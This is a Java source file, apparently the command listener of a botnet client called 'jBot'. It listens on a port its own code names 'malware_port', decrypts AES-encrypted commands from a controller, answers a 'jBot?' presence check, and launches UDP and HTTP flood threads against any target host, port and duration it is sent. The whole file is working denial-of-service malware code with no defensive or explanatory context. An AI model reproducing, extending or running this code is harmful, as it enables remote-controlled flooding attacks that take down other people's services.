package me.aaronakhtar.jbot.threads;

import me.aaronakhtar.jbot.JBot;
import me.aaronakhtar.jbot.crypto.Aes;
import me.aaronakhtar.jbot.threads.methods.Http;
import me.aaronakhtar.jbot.threads.methods.Udp;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

@SuppressWarnings("All")
public class Listener extends Thread {

    @Override
    public void run(){
        try {
            final ServerSocket serverSocket = new ServerSocket(JBot.malware_port);
            while(true){
                try{
                    Socket socket = serverSocket.accept();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    String line = reader.readLine();

                    if (line != null){
                        String f = Aes.decrypt(line, JBot.secret_key);

                        if (f.equalsIgnoreCase("jBot?")){
                            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
                            writer.println(Aes.encrypt("Yes.", JBot.secret_key));
                            writer.flush();
                            reader.close();
                            writer.close();
                            continue;
                        }else if (f.contains("udp")){
                            String[] args = f.split(" ")[1].split(":");
                            Thread thread = new Thread(new Udp(args[0], Integer.parseInt(args[1]), Integer.parseInt(args[2]), Integer.parseInt(args[3])));
                            JBot.threads.add(thread);
                            thread.start();
                            continue;
                        }else if (f.contains("http")){
                            String[] args = f.split(" ")[1].split(":");
                            int t = Integer.parseInt(args[3]);
                            for (int x = 0; x < t; x++) {
                                Thread thread = new Thread(new Http(args[0].replaceAll(";", ":"), Integer.parseInt(args[1]), args[2]));
                                JBot.threads.add(thread);
                                thread.start();
                            }
                            continue;
                        }

                    }
                    reader.close();
                    socket.close();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
